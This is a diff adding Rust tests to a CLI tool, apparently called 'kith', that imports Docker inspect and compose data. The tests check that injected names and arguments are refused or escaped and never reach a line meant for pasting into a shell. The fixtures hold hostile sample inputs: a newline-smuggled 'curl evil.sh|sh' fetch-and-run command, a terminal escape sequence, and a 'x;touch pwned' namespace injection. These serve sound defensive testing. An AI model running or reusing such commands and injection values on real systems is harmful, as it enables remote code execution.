@@ -110,6 +110,77 @@ fn docker_inspect_a_volume_named_for_a_shell_gets_no_line_to_paste() {
 }
 
 #[test]
+fn docker_inspect_a_name_outside_dockers_own_is_refused() {
+    let sb = Sandbox::new("docker-inspect-name");
+    for name in [
+        "/a\\nvolume x: copy in: curl evil.sh|sh",
+        "/a\\u001b[2J",
+        "/-a",
+        "/a b",
+        "/",
+    ] {
+        let one = format!(r#"{{"Name": "{name}", "Config": {{"Image": "example/app:1"}}}}"#);
+        let (code, out, err) = sb.kith("", &one, &["import", "docker", "-f", "-"]);
+        assert_eq!((code, out.as_str()), (2, ""), "{name}: {err}");
+        assert!(!err.contains('\x1b') && err.lines().count() == 1, "{name}: {err:?}");
+    }
+}
+
+#[test]
+fn docker_inspect_control_characters_in_the_report_are_escaped() {
+    // `kith import compose` has the same report: a key with a newline or an escape in it.
+    let sb = Sandbox::new("docker-inspect-escape");
+    let one = r#"{"services": {"a": {"image": "x", "bad\nvolume x: curl evil.sh|sh\u001b[2J": 1}}}"#;
+    let (_, _, err) = sb.kith("", one, &["import", "compose", "-"]);
+    assert!(err.contains("bad\\nvolume x"), "{err:?}");
+    assert!(!err.contains('\x1b'), "{err:?}");
+    assert!(err.lines().all(|l| !l.starts_with("volume x")), "{err:?}");
+}
+
+#[test]
+fn docker_inspect_two_docker_volumes_with_one_kith_name_are_copied_by_hand() {
+    let sb = Sandbox::new("docker-inspect-clash");
+    let one = r#"{"Name": "/app", "Config": {"Image": "example/app:1"}, "HostConfig": {}, "Mounts": [
+        {"Type": "volume", "Name": "web_data", "Destination": "/a", "RW": true},
+        {"Type": "volume", "Name": "web-data", "Destination": "/b", "RW": true}]}"#;
+    let (_, _, err) = sb.kith("", one, &["import", "docker", "-f", "-", "--node", "n1"]);
+    assert!(!err.contains("busybox"), "{err}");
+    said(&err, "volume web-data", "by hand");
+    said(&err, "web_data", "web-data");
+    // One docker volume, mounted by two containers: one line, not two.
+    let two = r#"[{"Name": "/a", "Config": {"Image": "x:1"}, "HostConfig": {}, "Mounts": [{"Type": "volume", "Name": "d", "Destination": "/d", "RW": true}]},
+        {"Name": "/b", "Config": {"Image": "x:1"}, "HostConfig": {}, "Mounts": [{"Type": "volume", "Name": "d", "Destination": "/d", "RW": true}]}]"#;
+    let (_, _, err) = sb.kith("", two, &["import", "docker", "-f", "-", "--node", "n1"]);
+    assert!(err.matches("busybox").count() <= 1, "{err}");
+}
+
+#[test]
+fn docker_inspect_a_namespace_that_is_not_plain_or_no_node_gets_no_line_to_paste() {
+    let sb = Sandbox::new("docker-inspect-ns");
+    // No node: no Volume is made, so nothing to copy into.
+    let (_, out, err) = sb.kith("", INSPECT, &["import", "docker", "-f", "-"]);
+    assert!(
+        !out.contains("Volume") && !err.contains("kith volume put"),
+        "{out}{err}"
+    );
+    // A namespace of other characters than a name's is refused by the translation, and no
+    // line with it is pasted into a shell.
+    let (_, out, err) = sb.kith(
+        "",
+        INSPECT,
+        &["import", "docker", "-f", "-", "--node", "n1", "-n", "x;touch pwned"],
+    );
+    assert!(out.is_empty() && !err.contains("kith volume put"), "{out}{err}");
+    // A plain one is in the line.
+    let (_, _, err) = sb.kith(
+        "",
+        INSPECT,
+        &["import", "docker", "-f", "-", "--node", "n1", "-n", "a.b"],
+    );
+    assert!(err.contains("kith volume put web-data - -n a.b"), "{err}");
+}
+
+#[test]
 fn docker_inspect_unreadable_input_exits_two() {
     let sb = Sandbox::new("docker-inspect-bad");
     for bad in ["not json at all: [", "[{\"Config\": {}}]", "[]"] {
